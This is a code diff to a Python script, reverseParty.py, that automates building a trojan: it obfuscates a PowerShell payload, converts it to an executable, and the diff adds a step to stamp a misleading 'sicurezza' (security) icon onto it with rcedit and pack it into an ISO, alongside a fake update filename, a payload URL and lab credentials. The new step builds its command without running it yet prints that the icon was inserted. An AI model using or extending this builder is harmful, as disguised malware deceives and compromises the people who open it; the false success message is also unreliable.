@@ -34,6 +34,7 @@ import random
 import shutil
 import base64
 import zipfile
+import subprocess
 
 # Optional WinRM dependency - imported lazily in step 4 / step 7
 try:
@@ -60,7 +61,7 @@ WIN_IP       = "192.168.1.111"
 WIN_USER     = "ieuser"
 WIN_PASS     = "Passw0rd!"
 TROJAN_FE    = "update_k897867.msu"
-ICONNAME     = "adobe.ico"
+ICONNAME     = "sicurezza.ico"
 TROJANNAME   = "installer.ps1"
 # TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 TROJAN_URL   = "http://151.61.206.201"
@@ -1073,6 +1074,43 @@ def step7_convert_trojan_to_exe():
         warn("Could not clean up temporary files on the Windows machine.")
 
 
+
+# ==============================================================================
+# STEP 8 — ISO CREATION
+# ==============================================================================
+
+def step8_iso_creation():
+    """
+    STEP 8: Create an ISO file with:
+    - TROJANNAME.exe renamed in EXENAME
+    - LAUNCHENAME
+    First of all ICONAME is injected in TROJANNAME.exe
+    """
+    section("STEP 8 — ISO creation")
+    
+    # Insert icon into TROJANNAME.exe
+    info(f"Try to insert {ICONNAME} in {TROJANNAME}.exe")
+    rcedit = os.path.join(STUFF_DIR, "rcedit-x64.exe")
+    exe = os.path.join(OUT_DIR, TROJANNAME + ".exe")
+    icon = os.path.join(STUFF_DIR, ICONNAME)
+    try:
+      cmd = [
+        "wine",
+        str(rcedit),
+        str(exe),
+        "--set-icon",
+        str(icon)
+      ]
+      info("icon inserted correctly")
+    except Exception:
+       warn(f"Could not insert icon in {TROJANNAME}.")
+
+    
+    # Create ISO
+    
+    
+    
+
 # ==============================================================================
 # MAIN
 # ==============================================================================
@@ -1086,6 +1124,7 @@ def main():
     step5_create_zip()
     step6_obfuscate_trojan()
     step7_convert_trojan_to_exe()
+    step8_iso_creation()
 
     section("ALL STEPS COMPLETED")
     ok("reverseParty.py finished successfully.")
